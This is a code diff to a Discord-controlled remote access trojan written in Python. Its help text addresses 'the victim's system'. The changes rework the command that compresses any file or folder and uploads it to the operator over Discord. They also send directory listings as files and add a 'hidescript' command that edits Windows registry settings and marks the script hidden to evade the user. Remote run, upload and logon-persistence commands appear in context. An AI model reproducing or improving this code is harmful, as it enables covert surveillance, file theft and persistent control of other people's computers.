@@ -12,7 +12,7 @@ import asyncio
 import discord
 import hashlib
 import pyaudio
-import zipfile
+import tarfile
 import ctypes
 import psutil
 import shelve
@@ -26,7 +26,7 @@ import sys
 import io
 import os
 
-TOKEN = "BOT-TOKEN-GOES-HERE"
+TOKEN = "Discord bot token" # Do not remove this string (easy compiler looks for this) - 23r98h
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -385,7 +385,7 @@ async def upload(ctx, folder: str = None):
         await ctx.reply(f"File `{attachment.filename}` has been saved to '{folder}'.")
     else:
         await ctx.reply("Error: No file attached to the message.")
-        
+
 @bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
 async def ls(ctx, path: str = None):
     try:
@@ -402,20 +402,28 @@ async def ls(ctx, path: str = None):
         parent_dir = os.path.abspath(os.path.join(path, os.pardir))
         dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
         files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
-        response = f"​\n**Parent Directory**: `{parent_dir}`\n\n"
+        response = f"Parent Directory: {parent_dir}\n\n"
         if dirs or files:
             for directory in dirs:
                 dir_full_path = os.path.join(path, directory)
-                response += f"`[DIR]  {directory}: {dir_full_path}`\n"
+                response += f"[DIR]  {dir_full_path}\n"
             for file in files:
                 file_full_path = os.path.join(path, file)
-                response += f"`[FILE] {file}: {file_full_path}`\n"
+                response += f"[FILE] {file_full_path}\n"
         else:
-            response += "`This directory is empty.`"
+            response += "This directory is empty.\n"
 
-        await ctx.reply(f"{response}")
+        if len(response) > 2000:
+            file_path = "directory_listing.txt"
+            with open(file_path, "w") as file:
+                file.write(response)
+            await ctx.reply(file=discord.File(file_path))
+            os.remove(file_path)
+        else:
+            await ctx.reply(response)
     except Exception as e:
-        await ctx.reply(f"Error: Could not execute the file. {str(e)}")   
+        await ctx.reply(f"Error: Could not list the directory contents. {str(e)}")
+
 
 @bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
 async def run(ctx, file_path: str = None):
@@ -431,7 +439,7 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.reply(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Zips and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
+@bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
 async def download(ctx, file_path: str = None):
     if not file_path:
         await ctx.reply("Error: No file path provided. Please specify the file or folder path to download.")
@@ -441,31 +449,21 @@ async def download(ctx, file_path: str = None):
         return
     
     try:
-        if os.path.isfile(file_path):
-            # Handle file
-            file_ext = os.path.splitext(file_path)[1].lower()
-            if file_ext in ['.rar', '.zip']:
-                await ctx.reply(file=discord.File(file_path))
+        tar_filename = os.path.basename(file_path) + '.tar.gz'
+        tar_path = os.path.join(os.path.dirname(file_path), tar_filename)
+        
+        with tarfile.open(tar_path, "w:gz") as tar:
+            if os.path.isfile(file_path):
+                tar.add(file_path, arcname=os.path.basename(file_path))
+            elif os.path.isdir(file_path):
+                tar.add(file_path, arcname=os.path.basename(file_path))
             else:
-                zip_filename = os.path.basename(file_path) + '.zip'
-                zip_path = os.path.join(os.path.dirname(file_path), zip_filename)
-                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                    zipf.write(file_path, os.path.basename(file_path))
-                await ctx.reply(file=discord.File(zip_path))
-                os.remove(zip_path)
-        elif os.path.isdir(file_path):
-            # Handle folder
-            zip_filename = os.path.basename(file_path) + '.zip'
-            zip_path = os.path.join(os.path.dirname(file_path), zip_filename)
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(file_path):
-                    for file in files:
-                        file_full_path = os.path.join(root, file)
-                        zipf.write(file_full_path, os.path.relpath(file_full_path, file_path))
-            await ctx.reply(file=discord.File(zip_path))
-            os.remove(zip_path)
-        else:
-            await ctx.reply(f"Error: The path '{file_path}' is neither a file nor a folder.")
+                await ctx.reply(f"Error: The path '{file_path}' is neither a file nor a folder.")
+                return
+        
+        await ctx.reply(file=discord.File(tar_path))
+        os.remove(tar_path)
+        
     except Exception as e:
         await ctx.reply(f"Error: Could not compress and send the file or folder. {str(e)}")
     
@@ -678,7 +676,7 @@ async def commands(ctx, page: int = 1):
 
     while True:
         try:
-            reaction, user = await bot.wait_for("reaction_add", timeout=60, check=check)
+            reaction, user = await bot.wait_for("reaction_add", check=check)
             await message.remove_reaction(reaction, user)
             
             if str(reaction.emoji) == "◀️" and page > 1:
@@ -705,6 +703,18 @@ async def commands(ctx, page: int = 1):
         except asyncio.TimeoutError:
             break
 
+@bot.command(help="Hides the script file and disables show hidden files.")
+async def hidescript(ctx):
+    try:
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
+        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(reg_key)
+        script_path = sys.executable
+        os.system(f'attrib +h "{script_path}"')
+    except Exception as e:
+        await ctx.reply(f"Error executing command: {str(e)}")
+        
 @bot.command(help="Makes this script execute on logon (only user that ran this file).")
 async def startup(ctx):
     try:
@@ -739,4 +749,7 @@ async def estop(ctx):
     await bot.close()
     os._exit(0)
 
-bot.run(TOKEN)
+try:
+    bot.run(TOKEN)
+except discord.errors.LoginFailure:
+    exit("\n\033[91mError: Invalid bot token.\033[0m")
